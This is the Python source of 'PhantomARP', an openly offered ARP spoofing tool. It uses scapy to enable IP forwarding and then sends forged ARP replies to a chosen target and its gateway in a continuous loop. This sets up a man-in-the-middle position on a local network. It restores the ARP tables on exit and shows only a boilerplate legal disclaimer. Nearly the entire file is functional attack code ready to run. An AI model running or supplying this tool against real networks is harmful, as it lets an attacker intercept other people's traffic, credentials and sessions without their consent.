import scapy.all as scapy
import time
import re
import subprocess
import logging
import sys
import argparse
from colorama import init, Fore, Style
from datetime import datetime
from tqdm import tqdm
import platform

# Initialize Colorama
init()

# Banner with Coordinated Bright Colors
banner = f"""
{Style.BRIGHT}{Fore.MAGENTA}                   ███████╗██╗  ██╗ █████╗ ███╗   ███╗████████╗ ██████╗ ██████╗ 
{Style.BRIGHT}{Fore.BLUE}                   ██╔════╝██║  ██║██╔══██╗████╗ ████║╚══██╔══╝██╔═══██╗██╔══██╗
{Style.BRIGHT}{Fore.CYAN}                   ███████╗███████║███████║██╔████╔██║   ██║   ██║   ██║██████╔╝
{Style.BRIGHT}{Fore.YELLOW}                   ╚════██║██╔══██║██╔══██║██║╚██╔╝██║   ██║   ██║   ██║██╔═══╝ 
{Style.BRIGHT}{Fore.RED}                   ███████║██║  ██║██║  ██║██║ ╚═╝ ██║   ██║   ╚██████╔╝██║     
{Style.BRIGHT}{Fore.RED}                   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝    ╚═════╝ ╚═╝     
{Style.BRIGHT}{Fore.CYAN}                                ---- PhantomARP: Advanced ARP Spoofer ----
{Style.BRIGHT}{Fore.YELLOW}                 ===================================================================
{Style.BRIGHT}{Fore.YELLOW}                                Version : 2.0      GitHub : github.com/anishalx7        
{Style.BRIGHT}{Fore.YELLOW}                 ===================================================================    
{Style.RESET_ALL}
"""

LEGAL_DISCLAIMER = "\n[!] Legal disclaimer: Usage of PhantomARP for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developer assumes no liability and is not responsible for any misuse or damage caused by this program."

# Configure logging
logging.basicConfig(
    filename=f'phantom_arp_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def print_colored_disclaimer():
    print(f"{Style.BRIGHT}{Fore.WHITE}{LEGAL_DISCLAIMER}{Style.RESET_ALL}")
    logging.info("Script started - Legal disclaimer displayed")

def enable_ip_forwarding():
    if platform.system() == "Linux":
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
            logging.info("IP forwarding enabled")
            print(f"{Fore.GREEN}[+] IP forwarding enabled{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            logging.error("Failed to enable IP forwarding")
            print(f"{Fore.RED}[!] Failed to enable IP forwarding{Style.RESET_ALL}")
    else:
        logging.warning("IP forwarding not enabled - not running on Linux")

def disable_ip_forwarding():
    if platform.system() == "Linux":
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True)
            logging.info("IP forwarding disabled")
            print(f"{Fore.GREEN}[+] IP forwarding disabled{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            logging.error("Failed to disable IP forwarding")
            print(f"{Fore.RED}[!] Failed to disable IP forwarding{Style.RESET_ALL}")

def get_mac(ip, iface):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface=iface)[0]
        
        if not answered_list:
            logging.warning(f"No response for IP {ip}")
            print(f"{Fore.RED}[!] Error: No response for IP {ip}. Ensure the IP is valid and the target is on the network.{Style.RESET_ALL}")
            return None
        
        mac = answered_list[0][1].hwsrc
        logging.info(f"Retrieved MAC {mac} for IP {ip}")
        return mac
    except Exception as e:
        logging.error(f"Error getting MAC for {ip}: {str(e)}")
        print(f"{Fore.RED}[!] Error getting MAC for {ip}: {str(e)}{Style.RESET_ALL}")
        return None

def spoof(target_ip, spoof_ip, iface, packet_rate):
    target_mac = get_mac(target_ip, iface)
    if target_mac is None:
        return False
    
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    try:
        scapy.send(packet, verbose=False, iface=iface)
        logging.info(f"Sent spoof packet to {target_ip} pretending to be {spoof_ip}")
        return True
    except Exception as e:
        logging.error(f"Error sending spoof packet: {str(e)}")
        print(f"{Fore.RED}[!] Error sending spoof packet: {str(e)}{Style.RESET_ALL}")
        return False

def restore(destination_ip, source_ip, iface):
    destination_mac = get_mac(destination_ip, iface)
    if destination_mac is None:
        return
    
    source_mac = get_mac(source_ip, iface)
    if source_mac is None:
        return
    
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    try:
        scapy.send(packet, count=4, verbose=False, iface=iface)
        logging.info(f"Restored ARP table for {destination_ip}")
        print(f"{Fore.GREEN}[+] Restored ARP table for {destination_ip}{Style.RESET_ALL}")
    except Exception as e:
        logging.error(f"Error restoring ARP table: {str(e)}")
        print(f"{Fore.RED}[!] Error restoring ARP table: {str(e)}{Style.RESET_ALL}")

def is_valid_ip(ip):
    pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return re.match(pattern, ip) is not None

def get_arguments():
    parser = argparse.ArgumentParser(description='PhantomARP: Advanced ARP Spoofer')
    parser.add_argument('-t', '--target', dest='target_ip', help='Target IP address')
    parser.add_argument('-g', '--gateway', dest='gateway_ip', help='Gateway IP address')
    parser.add_argument('-i', '--interface', dest='iface', default='eth0', help='Network interface (default: eth0)')
    parser.add_argument('-r', '--rate', dest='packet_rate', type=float, default=2.0, help='Packet send rate in seconds (default: 2.0)')
    return parser.parse_args() if not in_jupyter() else None

def in_jupyter():
    try:
        from IPython import get_ipython
        return get_ipython().__class__.__name__ == 'ZMQInteractiveShell'
    except:
        return False

def main():
    print(banner)
    print_colored_disclaimer()
    
    if in_jupyter():
        # Jupyter Notebook input
        target_ip = input("Enter Target IP: ")
        gateway_ip = input("Enter Gateway IP: ")
        iface = input("Enter Network Interface (default: eth0): ") or "eth0"
        packet_rate = float(input("Enter Packet Rate in seconds (default: 2.0): ") or 2.0)
    else:
        # Terminal input with argparse
        args = get_arguments()
        if not args or not args.target_ip or not args.gateway_ip:
            print(f"{Fore.RED}[!] Target IP and Gateway IP are required{Style.RESET_ALL}")
            return
        target_ip = args.target_ip
        gateway_ip = args.gateway_ip
        iface = args.iface
        packet_rate = args.packet_rate

    # Validate IPs
    if not is_valid_ip(target_ip) or not is_valid_ip(gateway_ip):
        print(f"{Fore.RED}[!] Invalid IP address format{Style.RESET_ALL}")
        logging.error("Invalid IP address format")
        return

    # Enable IP forwarding
    enable_ip_forwarding()

    sent_packets_count = 0
    try:
        with tqdm(desc="Spoofing Progress", unit="packets") as pbar:
            while True:
                if spoof(target_ip, gateway_ip, iface, packet_rate):
                    sent_packets_count += 1
                if spoof(gateway_ip, target_ip, iface, packet_rate):
                    sent_packets_count += 1
                pbar.update(2)
                time.sleep(packet_rate)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[+] Detected Ctrl+C. Resetting ARP tables...{Style.RESET_ALL}")
        logging.info("Script interrupted by user")
        restore(target_ip, gateway_ip, iface)
        restore(gateway_ip, target_ip, iface)
        disable_ip_forwarding()
        print(f"{Fore.GREEN}[+] Session completed. Total packets sent: {sent_packets_count}{Style.RESET_ALL}")
        logging.info(f"Session completed. Total packets sent: {sent_packets_count}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        logging.error(f"Unexpected error: {str(e)}")
        restore(target_ip, gateway_ip, iface)
        restore(gateway_ip, target_ip, iface)
        disable_ip_forwarding()

if __name__ == "__main__":
    main()



